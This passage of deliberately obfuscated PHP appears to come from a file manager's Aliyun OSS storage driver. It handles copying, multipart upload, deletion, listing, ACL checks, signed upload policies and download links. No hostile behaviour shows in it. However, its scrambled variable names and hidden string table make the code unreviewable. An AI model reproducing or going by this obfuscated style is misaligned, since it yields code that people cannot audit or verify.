$Ü⁄Úèß›[] = $äÊÌ∑∆Ã->getPrefix(); $this->cacheMethodInfoSet($äÊÌ∑∆Ã->getPrefix(), !0); } if ($—Ø“¢Èº === $∞–‚ô€º[22]) { break; } } $this->cacheMethodInfoSet($¶†Ì”üÇ, !0); return array($∞–‚ô€º[92] => $Ü⁄Úèß›, $∞–‚ô€º[93] => $ãÃƒìÎ¨); } public function copyFile($≠∂‹÷≈€, $≈œüÃÓ≤) { $›˝ﬁÔ˝” = $this->size($≠∂‹÷≈€); if ($›˝ﬁÔ˝” < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $≠∂‹÷≈€, $this->bucket, $this->pathEncode($≈œüÃÓ≤)); } catch (OSS\Core\OssException $ê∆ˆË• ) { return !1; } return $this->getPathOuter($≈œüÃÓ≤); } $ÓÑ∂Ä‰∑ = $this->multiCopyObject($≠∂‹÷≈€, $≈œüÃÓ≤, $›˝ﬁÔ˝”); return $ÓÑ∂Ä‰∑ ? $this->getPathOuter($≈œüÃÓ≤) : !1; } private function multiCopyObject($”≥‚˙∆ø, $õÛ’†òÌ, $£≈ÎËÊ√) { $ÀÆﬂ‘–˚ =& $_SERVER[Á≈ ä ∞]; try { $îÂ„Üåë = array(); if ($Ù≈äØ«û = $this->hashMd5($”≥‚˙∆ø)) { $îÂ„Üåë = array(OSS\OssClient::OSS_HEADERS => array($ÀÆﬂ‘–˚[1402] => $Ù≈äØ«û)); } $äá∏èÏ∞ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($õÛ’†òÌ), $îÂ„Üåë); $ ú≈õÃ™ = 1; $ëÃ≈ñ¯• = 0; $µ¨ÆÓ√ﬁ = array(); $˛ÊﬁôøÖ = 1024 * 1024 * 10; $˘ñîÎ∑ë = $this->client->generateMultiuploadParts($£≈ÎËÊ√, $˛ÊﬁôøÖ); foreach ($˘ñîÎ∑ë as $‚â–˜¿® => $Ôª˝∂‚À) { $≠âÑ“Ã© = $ëÃ≈ñ¯• + (int) $Ôª˝∂‚À[$ÀÆﬂ‘–˚[1403]]; $€àÄêÑæ = (int) $Ôª˝∂‚À[$ÀÆﬂ‘–˚[346]] + $≠âÑ“Ã© - 1; $ÎÔÔÔœÍ = array($ÀÆﬂ‘–˚[1404] => $≠âÑ“Ã©, $ÀÆﬂ‘–˚[1405] => $€àÄêÑæ); $µ¨ÆÓ√ﬁ[] = $this->client->uploadPartCopy($this->bucket, $”≥‚˙∆ø, $this->bucket, $this->pathEncode($õÛ’†òÌ), $ ú≈õÃ™, $äá∏èÏ∞, $ÎÔÔÔœÍ); $ ú≈õÃ™ = $ ú≈õÃ™ + 1; } $û¯íò™∏ = array(); foreach ($µ¨ÆÓ√ﬁ as $‚â–˜¿® => $ìÚÅ¨ÄÉ) { $û¯íò™∏[] = array($ÀÆﬂ‘–˚[1406] => $‚â–˜¿® + 1, $ÀÆﬂ‘–˚[1407] => $ìÚÅ¨ÄÉ); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($õÛ’†òÌ), $äá∏èÏ∞, $û¯íò™∏); } catch (OSS\Core\OssException $∑ﬂ†ê∞Ä) { return !1; } return !0; } public function moveFile($¿„ƒà±‘, $±‹ö∫¡ª) { if ($this->copyFile($¿„ƒà±‘, $±‹ö∫¡ª)) { $this->remove($¿„ƒà±‘); return $this->getPathOuter($±‹ö∫¡ª); } return !1; } public function delFile($ Âãœ®õ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ Âãœ®õ)); } catch (OSS\Core\OssException $ÚÍç“ Î) { return !1; } return !0; } public function delFolder($ﬁ“”Ú›à) { $ƒ˝¢≠æå =& $_SERVER[Á≈ ä ∞]; if (!$this->exist($ﬁ“”Ú›à)) { return !0; } $this->listItemCache = !1; $˛¯ØÍÈ™ = $this->fileList($ﬁ“”Ú›à); $this->listItemCache = !0; $¬∞⁄ãóÂ = trim($ﬁ“”Ú›à, $ƒ˝¢≠æå[18]) . $ƒ˝¢≠æå[18]; if (!empty($ﬁ“”Ú›à) && $ﬁ“”Ú›à !== $ƒ˝¢≠æå[207] && !in_array($¬∞⁄ãóÂ, $˛¯ØÍÈ™[$ƒ˝¢≠æå[92]])) { $˛¯ØÍÈ™[$ƒ˝¢≠æå[92]][] = $¬∞⁄ãóÂ; } $•ïø≤„ú = $this->delByBatch($˛¯ØÍÈ™[$ƒ˝¢≠æå[93]]); if (!$•ïø≤„ú) { return !1; } $•ïø≤„ú = $this->delByBatch($˛¯ØÍÈ™[$ƒ˝¢≠æå[92]]); if (!$•ïø≤„ú) { return !1; } return $this->delFile($¬∞⁄ãóÂ); } private function delByBatch($∆Ù®∂õ¿) { foreach (array_chunk($∆Ù®∂õ¿, 1000) as $›÷˜¿ôê) { try { $this->client->deleteObjects($this->bucket, $›÷˜¿ôê); } catch (OSS\Core\OssException $Ÿîû”Èﬁ) { return !1; } } return !0; } public function rename($∞Ç∞œ◊Ø, $Ω‹ã”–ˆ) { return $this->renameObject($∞Ç∞œ◊Ø, $Ω‹ã”–ˆ); } private function fileInfo($Èﬁ≤∂≤Ê, $Û∑†¸–˛ = false, $£≤§õ¯Û = array()) { $ÉﬂÁ˙†™ =& $_SERVER[Á≈ ä ∞]; $¨Ç”Ê„Ù = array($ÉﬂÁ˙†™[42] => $this->pathThis($Èﬁ≤∂≤Ê), $ÉﬂÁ˙†™[94] => $this->getPathOuter($Èﬁ≤∂≤Ê), $ÉﬂÁ˙†™[43] => $ÉﬂÁ˙†™[209], $ÉﬂÁ˙†™[86] => isset($£≤§õ¯Û[$ÉﬂÁ˙†™[86]]) ? $£≤§õ¯Û[$ÉﬂÁ˙†™[86]] : 0, $ÉﬂÁ˙†™[184] => $this->ext($Èﬁ≤∂≤Ê)); if ($Û∑†¸–˛) { return $¨Ç”Ê„Ù; } $¨Ç”Ê„Ù[$ÉﬂÁ˙†™[210]] = $¨Ç”Ê„Ù[$ÉﬂÁ˙†™[95]] = 0; $¨Ç”Ê„Ù[$ÉﬂÁ˙†™[211]] = $¨Ç”Ê„Ù[$ÉﬂÁ˙†™[212]] = !0; if (empty($£≤§õ¯Û)) { $⁄Ø¶Ô±Ä = $this->objectMeta($Èﬁ≤∂≤Ê); if (!$⁄Ø¶Ô±Ä) { return $¨Ç”Ê„Ù; } $£≤§õ¯Û = array($ÉﬂÁ˙†™[95] => strtotime($⁄Ø¶Ô±Ä[$ÉﬂÁ˙†™[1401]]), $ÉﬂÁ˙†™[86] => $⁄Ø¶Ô±Ä[$ÉﬂÁ˙†™[1400]] + 0); } if (isset($£≤§õ¯Û[$ÉﬂÁ˙†™[86]])) { $¨Ç”Ê„Ù[$ÉﬂÁ˙†™[86]] = $£≤§õ¯Û[$ÉﬂÁ˙†™[86]]; } if (isset($£≤§õ¯Û[$ÉﬂÁ˙†™[95]])) { $¨Ç”Ê„Ù[$ÉﬂÁ˙†™[95]] = $£≤§õ¯Û[$ÉﬂÁ˙†™[95]]; } if (isset($£≤§õ¯Û[$ÉﬂÁ˙†™[213]]) && !trim($¨Ç”Ê„Ù[$ÉﬂÁ˙†™[95]])) { $¨Ç”Ê„Ù[$ÉﬂÁ˙†™[95]] = $£≤§õ¯Û[$ÉﬂÁ˙†™[213]]; } return $¨Ç”Ê„Ù; } private function folderInfo($˝Ü÷èÙº, $Ø¿±ù˝› = false, $ﬂß≤∂›˙ = array()) { $éÃ˚ùË’ =& $_SERVER[Á≈ ä ∞]; $Îï±˘ú˙ = array($éÃ˚ùË’[42] => $this->pathThis($˝Ü÷èÙº), $éÃ˚ùË’[94] => $this->getPathOuter($éÃ˚ùË’[18] . $˝Ü÷èÙº), $éÃ˚ùË’[43] => $éÃ˚ùË’[85]); if ($Ø¿±ù˝›) { return $Îï±˘ú˙; } $Îï±˘ú˙[$éÃ˚ùË’[210]] = $Îï±˘ú˙[$éÃ˚ùË’[95]] = 0; $Îï±˘ú˙[$éÃ˚ùË’[211]] = $Îï±˘ú˙[$éÃ˚ùË’[212]] = !0; if (empty($ﬂß≤∂›˙)) { $˝Ü÷èÙº = rtrim($˝Ü÷èÙº, $éÃ˚ùË’[18]) . $éÃ˚ùË’[18]; $†˘ﬁ‡ÿ· = $this->objectMeta($˝Ü÷èÙº); if (!$†˘ﬁ‡ÿ·) { return $Îï±˘ú˙; } $ﬂß≤∂›˙ = array($éÃ˚ùË’[210] => $†˘ﬁ‡ÿ·[$éÃ˚ùË’[520]][$éÃ˚ùË’[1408]], $éÃ˚ùË’[95] => strtotime($†˘ﬁ‡ÿ·[$éÃ˚ùË’[1401]])); } if (isset($ﬂß≤∂›˙[$éÃ˚ùË’[95]])) { $Îï±˘ú˙[$éÃ˚ùË’[95]] = $ﬂß≤∂›˙[$éÃ˚ùË’[95]]; } if (isset($ﬂß≤∂›˙[$éÃ˚ùË’[210]])) { $Îï±˘ú˙[$éÃ˚ùË’[210]] = $ﬂß≤∂›˙[$éÃ˚ùË’[210]]; } return $Îï±˘ú˙; } public function listPath($À¡…Ü‹, $˙ÉëÙä— = false) { $¡—˝Ü√€ =& $_SERVER[Á≈ ä ∞]; $√æ¨ ß± = $this->fileList($À¡…Ü‹, $¡—˝Ü√€[18], !0); foreach ($√æ¨ ß±[$¡—˝Ü√€[92]] as $ÈàÈ¬Â€ => $À‹≤º») { $√æ¨ ß±[$¡—˝Ü√€[92]][$ÈàÈ¬Â€] = $this->folderInfo($À‹≤º», $˙ÉëÙä—, $À‹≤º»); } foreach ($√æ¨ ß±[$¡—˝Ü√€[93]] as $ÈàÈ¬Â€ => $À‹≤º») { $√æ¨ ß±[$¡—˝Ü√€[93]][$ÈàÈ¬Â€] = $this->fileInfo($À‹≤º»[$¡—˝Ü√€[42]], $˙ÉëÙä—, $À‹≤º»); } return $√æ¨ ß±; } protected function infoChildren($˝Ú—óã«, &$ıÕõÍ¸ù) { $Ûã‘≈´™ =& $_SERVER[Á≈ ä ∞]; $ÒË◊éﬁã = $this->fileList($˝Ú—óã«, $Ûã‘≈´™[22], !0); $ıÕõÍ¸ù[$Ûã‘≈´™[88]] += count($ÒË◊éﬁã[$Ûã‘≈´™[92]]); $ıÕõÍ¸ù[$Ûã‘≈´™[87]] += count($ÒË◊éﬁã[$Ûã‘≈´™[93]]); foreach ($ÒË◊éﬁã[$Ûã‘≈´™[93]] as $ÅΩ‘àÂÂ) { if (!$ÅΩ‘àÂÂ || !$ÅΩ‘àÂÂ[$Ûã‘≈´™[86]]) { continue; } $ıÕõÍ¸ù[$Ûã‘≈´™[86]] += $ÅΩ‘àÂÂ[$Ûã‘≈´™[86]]; } } public function has($ééü“¸—, $ÕÇî®ú¢ = false, $úˆÊÏ±„ = true) { $î»∑ØúÈ =& $_SERVER[Á≈ ä ∞]; $ééü“¸— = trim($ééü“¸—, $î»∑ØúÈ[18]); $˛ã˘Ω˘ñ = empty($ééü“¸—) && $ééü“¸— !== $î»∑ØúÈ[207] ? $î»∑ØúÈ[22] : $ééü“¸— . $î»∑ØúÈ[18]; $ˆÛ™‚˙á = $î»∑ØúÈ[22]; $¥Ωâäû• = 500; $’›«…„¸ = $ﬂ⁄„€Û¥ = 0; while (!0) { check_abort(); $’øﬂÔ≈Õ = array($î»∑ØúÈ[1396] => $î»∑ØúÈ[18], $î»∑ØúÈ[1397] => $˛ã˘Ω˘ñ, $î»∑ØúÈ[1398] => $¥Ωâäû•, $î»∑ØúÈ[1399] => $ˆÛ™‚˙á); try { $„ûïÛÛê = $this->client->listObjects($this->bucket, $’øﬂÔ≈Õ); } catch (OSS\Core\OssException $åôÆïªÄ) { break; } $ˆÛ™‚˙á = $„ûïÛÛê->getNextMarker(); $˘Ï˚ÓÌµ = $„ûïÛÛê->getObjectList(); $Çòú˛ÉÂ = $„ûïÛÛê->getPrefixList(); if ($ÕÇî®ú¢) { if (count($˘Ï˚ÓÌµ) > 1 || count($˘Ï˚ÓÌµ) == 1 && $˘Ï˚ÓÌµ[0]->getKey() != $˛ã˘Ω˘ñ) { $’›«…„¸ += count($˘Ï˚ÓÌµ) - 1; } if (!empty($Çòú˛ÉÂ)) { $ﬂ⁄„€Û¥ += count($Çòú˛ÉÂ); } if ($ˆÛ™‚˙á === $î»∑ØúÈ[22]) { break; } continue; } if ($úˆÊÏ±„) { if (!empty($˘Ï˚ÓÌµ)) { if (count($˘Ï˚ÓÌµ) > 1 || $˘Ï˚ÓÌµ[0]->getKey() != $˛ã˘Ω˘ñ) { return !0; } } } else { if (!empty($Çòú˛ÉÂ)) { return !0; } } if ($ˆÛ™‚˙á === $î»∑ØúÈ[22]) { break; } } if ($ÕÇî®ú¢) { return array($î»∑ØúÈ[217] => $’›«…„¸, $î»∑ØúÈ[218] => $ﬂ⁄„€Û¥); } return !1; } public function listAll($¸È›˛◊˝) { $È˛°ÉÖ¯ =& $_SERVER[Á≈ ä ∞]; $Ô¯£ÜÅ∂ = $this->fileList($¸È›˛◊˝, $È˛°ÉÖ¯[22], !0); $á¡ˆø‘÷ = array(); foreach ($Ô¯£ÜÅ∂[$È˛°ÉÖ¯[93]] as $”å⁄–›ﬂ) { $á¡ˆø‘÷[$”å⁄–›ﬂ[$È˛°ÉÖ¯[42]]] = $”å⁄–›ﬂ[$È˛°ÉÖ¯[86]]; } foreach ($Ô¯£ÜÅ∂[$È˛°ÉÖ¯[92]] as $”å⁄–›ﬂ) { if (is_string($”å⁄–›ﬂ)) { $á¡ˆø‘÷[$”å⁄–›ﬂ] = 0; } } return $this->listAllFiles($¸È›˛◊˝, array_keys($á¡ˆø‘÷), $á¡ˆø‘÷); } public function canRead($ª¿≥éÖß) { $óΩ¡¿‰æ =& $_SERVER[Á≈ ä ∞]; $” ˝Á÷ö = $this->pathAcl($ª¿≥éÖß); return $” ˝Á÷ö == $óΩ¡¿‰æ[1409] || $” ˝Á÷ö == $óΩ¡¿‰æ[565] ? !0 : !1; } public function canWrite($˜∆Ñ‰Í÷) { $¡¯‰«¢µ = $this->pathAcl($˜∆Ñ‰Í÷); return $¡¯‰«¢µ == $_SERVER[Á≈ ä ∞][565] ? !0 : !1; } public function pathAcl($©∂ÄÔÎ†) { $‘Ä…Æ∑£ =& $_SERVER[Á≈ ä ∞]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $ÆáÌ™•Î = $this->client->getObjectAcl($this->bucket, $this->pathEncode($©∂ÄÔÎ†)); } catch (OSS\Core\OssException $ﬁæ˛˛ïÏ) { return !1; } $ôÙ‹ é§ = $ÆáÌ™•Î == $‘Ä…Æ∑£[47] ? $this->bucketAcl : $ÆáÌ™•Î; if ($ôÙ‹ é§ == $‘Ä…Æ∑£[1410]) { return $‘Ä…Æ∑£[1409]; } if ($ôÙ‹ é§ == $‘Ä…Æ∑£[1411]) { return $‘Ä…Æ∑£[565]; } return $ôÙ‹ é§; } private function chmodPath($£÷ŒÂ˚˘, $Ã‚¬◊÷ƒ = '') { $û‘™ûœΩ =& $_SERVER[Á≈ ä ∞]; $˚µêúî… = empty($Ã‚¬◊÷ƒ) ? $û‘™ûœΩ[1411] : $Ã‚¬◊÷ƒ; $˛¸≈⁄–Ñ = array($û‘™ûœΩ[47], $û‘™ûœΩ[208], $û‘™ûœΩ[1410], $û‘™ûœΩ[1411]); if (!in_array($˚µêúî…, $˛¸≈⁄–Ñ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($£÷ŒÂ˚˘), $˚µêúî…); } catch (OSS\Core\OssException $∞á†Ûıë) { return !1; } return !0; } public function getContent($üªèÒÇ•) { return $this->fileSubstr($üªèÒÇ•, -1); } public function setContent($ÿÔ©√Òî, $Åø‡›≠ê = '') { $ñÍ‹Ø¨ﬂ =& $_SERVER[Á≈ ä ∞]; try { $˜∑È»¬µ = $this->trafficLimit($ñÍ‹Ø¨ﬂ[1412]); $Öì˘Î¯Æ = $this->client->putObject($this->bucket, $this->pathEncode($ÿÔ©√Òî), $Åø‡›≠ê, $˜∑È»¬µ); } catch (OSS\Core\OssException $°âŒ‡Ù˚) { return !1; } $ˆı∫«¸Ì = array($ñÍ‹Ø¨ﬂ[1402] => trim($Öì˘Î¯Æ[$ñÍ‹Ø¨ﬂ[1413]], $ñÍ‹Ø¨ﬂ[128]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ÿÔ©√Òî))); $this->updateObjMeta($ÿÔ©√Òî, $ˆı∫«¸Ì); return isset($Öì˘Î¯Æ[$ñÍ‹Ø¨ﬂ[1414]][$ñÍ‹Ø¨ﬂ[1361]]) ? !0 : !1; } private function updateObjMeta($˚ëÚÊÅø, $õ∏≥ø€˚) { $˚ëÚÊÅø = $this->pathEncode($˚ëÚÊÅø); try { $´‹âØâŒ = array(OSS\OssClient::OSS_HEADERS => $õ∏≥ø€˚); $this->client->copyObject($this->bucket, $˚ëÚÊÅø, $this->bucket, $˚ëÚÊÅø, $´‹âØâŒ); } catch (OSS\Core\OssException $ÿ≠Í©Îö) { return !1; } return !0; } public function upload($êßƒ±ô–, $ˆ§ì•ïﬂ, $ØåÉäÛ— = false, $´èˆåÚ¨ = REPEAT_REPLACE) { $à˜’±¬∆ =& $_SERVER[Á≈ ä ∞]; $ü¡®Ü„µ = trim($êßƒ±ô–, $à˜’±¬∆[18]); $ŸÉ’ÌèØ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($à˜’±¬∆[1402] => @md5_file($ˆ§ì•ïﬂ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($êßƒ±ô–))); $ŸÉ’ÌèØ = $this->trafficLimit($à˜’±¬∆[1412], $ŸÉ’ÌèØ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ü¡®Ü„µ), $ˆ§ì•ïﬂ, $ŸÉ’ÌèØ); } catch (OSS\Core\OssException $πÛ∆°Ø¬) { return !1; } return $this->getPathOuter($êßƒ±ô–); } public function getHost() { $ﬁÿµ˝—æ =& $_SERVER[Á≈ ä ∞]; $Ü∫ÓíÄ’ = explode($ﬁÿµ˝—æ[193], parent::getHost()); return $Ü∫ÓíÄ’[0] . $ﬁÿµ˝—æ[193] . $this->bucket . $ﬁÿµ˝—æ[20] . $Ü∫ÓíÄ’[1]; } public function uploadFormData($„‹»¨¢æ, $ÿéÖœñ– = 3600) { $ŒÙ—ÕåË =& $_SERVER[Á≈ ä ∞]; if (!($≈˘âçÑ» = $this->getHost())) { return !1; } $¿ëÏô‘£ = $ÿéÖœñ–; $Çøç¬ß¨ = date($ŒÙ—ÕåË[1415], time() + $¿ëÏô‘£); $Ωî—˙˚˜ = new DateTime($Çøç¬ß¨); $Î—åâä‡ = $Ωî—˙˚˜->format(DateTime::ISO8601); $˝†°ÆÒ› = strpos($Î—åâä‡, $ŒÙ—ÕåË[305]); $Î—åâä‡ = substr($Î—åâä‡, 0, $˝†°ÆÒ›) . $ŒÙ—ÕåË[1416]; $Âœµõ—« = 1048576000 * 5; $ﬁ‰Ωüãﬁ = $this->pathFather($„‹»¨¢æ); $¨ßéè⁄ä = array($ŒÙ—ÕåË[1315] => $Î—åâä‡, $ŒÙ—ÕåË[1316] => array(array($ŒÙ—ÕåË[1417], 0, $Âœµõ—«), array($ŒÙ—ÕåË[1319], $ŒÙ—ÕåË[1320], $ﬁ‰Ωüãﬁ))); $∞•ˆ⁄◊¿ = base64_encode(json_encode($¨ßéè⁄ä)); $âŒ°‡Ñã = base64_encode(hash_hmac($ŒÙ—ÕåË[241], $∞•ˆ⁄◊¿, $this->secret, !0)); $—µë’≥Í = array($ŒÙ—ÕåË[1325] => $∞•ˆ⁄◊¿, $ŒÙ—ÕåË[1418] => $this->accessKey, $ŒÙ—ÕåË[1321] => $ŒÙ—ÕåË[1313], $ŒÙ—ÕåË[1419] => $âŒ°‡Ñã, $ŒÙ—ÕåË[191] => $≈˘âçÑ»); $—µë’≥Í = $this->trafficLimit($ŒÙ—ÕåË[1412], $—µë’≥Í); return $—µë’≥Í; } public function multiUploadFormData($ﬂÖ‹¿ÕÇ, $≈´•ó¯˘ = 3600) { $¨ô∆ãÏ⁄ =& $_SERVER[Á≈ ä ∞]; if (!($òÃ‹îÉ¬ = $this->getHost())) { return !1; } $‰‘êµŸÈ = $this->trafficLimit($¨ô∆ãÏ⁄[1412]); $«®√ÎŸÁ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ﬂÖ‹¿ÕÇ), $‰‘êµŸÈ); return array($¨ô∆ãÏ⁄[233] => $«®√ÎŸÁ, $¨ô∆ãÏ⁄[191] => $òÃ‹îÉ¬ . $¨ô∆ãÏ⁄[18] . $this->pathEncode($ﬂÖ‹¿ÕÇ), $¨ô∆ãÏ⁄[234] => gmdate($¨ô∆ãÏ⁄[1420]), $¨ô∆ãÏ⁄[104] => $ﬂÖ‹¿ÕÇ); } public function multiUploadAuthData($ æ¶òõ, $Ìë«œ£Ï = array()) { $Ó†ú—…Ç =& $_SERVER[Á≈ ä ∞]; $‡ò’ﬁò≈ = isset($Ìë«œ£Ï[$Ó†ú—…Ç[234]]) ? $Ìë«œ£Ï[$Ó†ú—…Ç[234]] : gmdate($Ó†ú—…Ç[1420]); $º‹‘õò‡ = isset($Ìë«œ£Ï[$Ó†ú—…Ç[184]]) ? $Ìë«œ£Ï[$Ó†ú—…Ç[184]] : $Ó†ú—…Ç[22]; $¬®‡‰˚÷ = $ æ¶òõ; if (isset($Ìë«œ£Ï[$Ó†ú—…Ç[104]])) { $¬®‡‰˚÷ = $Ìë«œ£Ï[$Ó†ú—…Ç[104]]; unset($Ìë«œ£Ï[$Ó†ú—…Ç[104]]); } if (isset($Ìë«œ£Ï[$Ó†ú—…Ç[235]])) { $Ìë«œ£Ï[$Ó†ú—…Ç[234]] = $‡ò’ﬁò≈; return $this->listUploadParts($¬®‡‰˚÷, $Ìë«œ£Ï); } $¨ı∑Í„Å = array($Ó†ú—…Ç[236], $Ó†ú—…Ç[22], $Ó†ú—…Ç[130], $‡ò’ﬁò≈, "\x78\55\157\163\163\55\144\x61\164\x65\72{$‡ò’ﬁò≈}", $Ó†ú—…Ç[18] . $this->bucket . $Ó†ú—…Ç[18] . $¬®‡‰˚÷ . $º‹‘õò‡); if (strpos($º‹‘õò‡, $Ó†ú—…Ç[237]) === 0) { $¨ı∑Í„Å[0] = $Ó†ú—…Ç[238]; if ($Æ° ù”Ç = $this->trafficLimit($Ó†ú—…Ç[1412])) { $¬®‡‰˚÷ = $Ó†ú—…Ç[1421]; array_splice($¨ı∑Í„Å, 5, 0, $¬®‡‰˚÷ . $Ó†ú—…Ç[4] . $Æ° ù”Ç[$¬®‡‰˚÷]); } } if (isset($Ìë«œ£Ï[$Ó†ú—…Ç[239]]) && $Ìë«œ£Ï[$Ó†ú—…Ç[239]] == $Ó†ú—…Ç[240]) { $¨ı∑Í„Å[0] = $Ó†ú—…Ç[240]; } if (!empty($Ìë«œ£Ï[$Ó†ú—…Ç[1422]])) { $‹çÕ¿±‰ = array_merge(array($¨ı∑Í„Å[4]), $Ìë«œ£Ï[$Ó†ú—…Ç[1422]]); sort($‹çÕ¿±‰); $¨ı∑Í„Å[4] = implode($Ó†ú—…Ç[11], $‹çÕ¿±‰); } $ù¡éùÛÁ = implode($Ó†ú—…Ç[11], $¨ı∑Í„Å); $†ÿŒ¨∏ô = base64_encode(hash_hmac($Ó†ú—…Ç[241], $ù¡éùÛÁ, $this->secret, !0)); $éâÜÎÌ¿ = $Ó†ú—…Ç[1386] . $this->accessKey . $Ó†ú—…Ç[4] . $†ÿŒ¨∏ô; if (strpos($º‹‘õò‡, $Ó†ú—…Ç[237]) === 0) { $éâÜÎÌ¿ = array($Ó†ú—…Ç[243] => $éâÜÎÌ¿, $Ó†ú—…Ç[234] => $‡ò’ﬁò≈); if ($Æ° ù”Ç) { $éâÜÎÌ¿ = array_merge($éâÜÎÌ¿, $Æ° ù”Ç); } } return $éâÜÎÌ¿; } public function listUploadParts($æóÜÆ∆ó, $ÄÎÃ‘Áû) { $‘îë£Œ√ =& $_SERVER[Á≈ ä ∞]; $˘÷ÅÕ‡Í = parse_url_query($ÄÎÃ‘Áû[$‘îë£Œ√[184]]); $ÕÃ‹ìëÎ = $this->client->listParts($this->bucket, $this->pathEncode($æóÜÆ∆ó), $˘÷ÅÕ‡Í[$‘îë£Œ√[233]]); $ÂÔÛ‡‘Ñ = $ÕÃ‹ìëÎ->getListPart(); $†Ñ«ÏøÛ = array(); foreach ($ÂÔÛ‡‘Ñ as $ìºˆñÈÈ) { $†Ñ«ÏøÛ[] = array($‘îë£Œ√[1406] => $ìºˆñÈÈ->getPartNumber(), $‘îë£Œ√[1407] => trim($ìºˆñÈÈ->getETag(), $‘îë£Œ√[128])); } unset($ÄÎÃ‘Áû[$‘îë£Œ√[235]], $ÄÎÃ‘Áû[$‘îë£Œ√[239]]); $¿ó„æ‡◊ = $this->multiUploadAuthData($æóÜÆ∆ó, $ÄÎÃ‘Áû); if (empty($¿ó„æ‡◊)) { return !1; } return array($‘îë£Œ√[243] => $¿ó„æ‡◊, $‘îë£Œ√[234] => $ÄÎÃ‘Áû[$‘îë£Œ√[234]], $‘îë£Œ√[245] => $†Ñ«ÏøÛ); } public function download($”∞á∞à·, $Ûâ„å”≠) { if ($this->isFolder($”∞á∞à·)) { return !1; } try { $ñ”ûæùÖ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ûâ„å”≠); $ñ”ûæùÖ = $this->trafficLimit($_SERVER[Á≈ ä ∞][119], $ñ”ûæùÖ); $this->client->getObject($this->bucket, $this->pathEncode($”∞á∞à·), $ñ”ûæùÖ); } catch (OSS\Core\OssException $üõÃÜ”ã) { return !1; } return $Ûâ„å”≠; } public function fileSubstr($íÔ‹å®, $‡‘‰§ô¨ = 0, $´ºÇå’Ò = false) { if ($‡‘‰§ô¨ === -1) { $ŒëÑ∑†è = array(); } else { if ($´ºÇå’Ò === !1) { $≥›∆™ˆ¨ = $this->size($íÔ‹å®); } else { $≥›∆™ˆ¨ = $‡‘‰§ô¨ + $´ºÇå’Ò - 1; } $ŒëÑ∑†è = array(OSS\OssClient::OSS_RANGE => "{$‡‘‰§ô¨}\x2d{$≥›∆™ˆ¨}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($íÔ‹å®), $ŒëÑ∑†è); } catch (OSS\Core\OssException $°ˆá≤Õ˚) { think_exception($°ˆá≤Õ˚->getMessage()); return !1; } } private function trafficLimit($¿∑Â§‡√, $»ù›®òÊ = array()) { $¯≈¢≥ÿ€ =& $_SERVER[Á≈ ä ∞]; if ($¿∑Â§‡√ == $¯≈¢≥ÿ€[1412] && $this->isUploadServer() || $¿∑Â§‡√ == $¯≈¢≥ÿ€[119] && $this->isFileOutServer()) { return $»ù›®òÊ; } $Ô˙®¯…ä = floatval($GLOBALS[$¯≈¢≥ÿ€[16]][$¯≈¢≥ÿ€[99]][$¯≈¢≥ÿ€[117]][$¿∑Â§‡√]) * 1024 * 1024 * 8; if (!$Ô˙®¯…ä) { return $»ù›®òÊ; } $Ô˙®¯…ä = $Ô˙®¯…ä < 819200 ? 819200 : ($Ô˙®¯…ä > 838860800 ? 838860800 : $Ô˙®¯…ä); $»ù›®òÊ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($Ô˙®¯…ä); return $»ù›®òÊ; } public function link($˛ø—‰π•, $‡√ü˙òœ = array()) { $¥„«Ã∫∆ =& $_SERVER[Á≈ ä ∞]; if (!$this->exist($˛ø—‰π•) || $this->isFolder($˛ø—‰π•)) { return !1; } try { $‡√ü˙òœ = $this->trafficLimit($¥„«Ã∫∆[119], $‡√ü˙òœ); $¥≠É˙ôπ = $this->client->signUrl($this->bucket, $this->pathEncode($˛ø—‰π•), 3600 * 12, $¥„«Ã∫∆[240], $‡√ü˙òœ); return $this->getCdnLink($¥≠É˙ôπ); } catch (OSS\Core\OssException $Õ¥ôºâ) { return !1; } } public function fileOut($ùíÏÆÌÖ, $¯§òö÷— = false, $¯˛Û∂®¨ = false, $í∆Ω´É™ = '') { $É˛ÈÖÆù =& $_SERVER[Á≈ ä ∞]; if ($this->isFileOutServer()) { return $this->fileOutServer($ùíÏÆÌÖ, $¯§òö÷—, $¯˛Û∂®¨, $í∆Ω´É™); } if (!$¯˛Û∂®¨) { $¯˛Û∂®¨ = $this->pathThis($ùíÏÆÌÖ); } $¯˛Û∂®¨ = rawurlencode($¯˛Û∂®¨); $ˆÉ•«ﬂö = get_file_mime(get_path_ext($¯˛Û∂®¨)); if ($ˆÉ•«ﬂö == $É˛ÈÖÆù[227]) { return parent::fileOut($ùíÏÆÌÖ, $¯§òö÷—, $¯˛Û∂®¨, $í∆Ω´É™); } $¯§òö÷— = $¯§òö÷— ? $É˛ÈÖÆù[1423] : $É˛ÈÖÆù[1424]; $”óâõœ√ = array(OSS\OssClient::OSS_SUB_RESOURCE => $É˛ÈÖÆù[1425] . rawurlencode("{$¯§òö÷—}\x3b\146\x69\154\x65\156\x61\155\x65\75{$¯˛Û∂®¨}")); $”óâõœ√[OSS\OssClient::OSS_SUB_RESOURCE] .= $É˛ÈÖÆù[1426] . rawurlencode($ˆÉ•«ﬂö); $ÅÊ®ÿº∫ = $this->link($ùíÏÆÌÖ, $”óâõœ√); $this->fileOutLink($ÅÊ®ÿº∫); } public function fileOutServer($…ª¥Ç›Û, $√Ñã∂Ç¬ = false, $ñø ·¸∆ = false, $–È˜◊€„ = '') { parent::fileOut($…ª¥Ç›Û, $√Ñã∂Ç¬, $ñø ·¸∆, $–È˜◊€„); } public function fileOutImage($”ïÖ˝ﬂà, $´‘ÿØøú = 250) { $π‚–áÌ§ = array(OSS\OssClient::OSS_PROCESS => 